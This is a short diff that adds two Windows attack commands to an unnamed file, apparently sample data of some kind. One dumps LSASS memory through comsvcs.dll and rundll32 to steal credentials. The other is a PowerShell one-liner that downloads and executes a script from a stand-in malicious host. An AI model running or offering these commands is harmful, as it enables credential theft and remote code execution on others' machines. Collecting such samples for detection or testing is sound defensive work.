@@ -1,0 +1,2 @@
+copy comsvcs.dll c.dll && rundll32.exe c.dll, MiniDump 500 lsass.bin
+powershell.exe -NoProfile -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
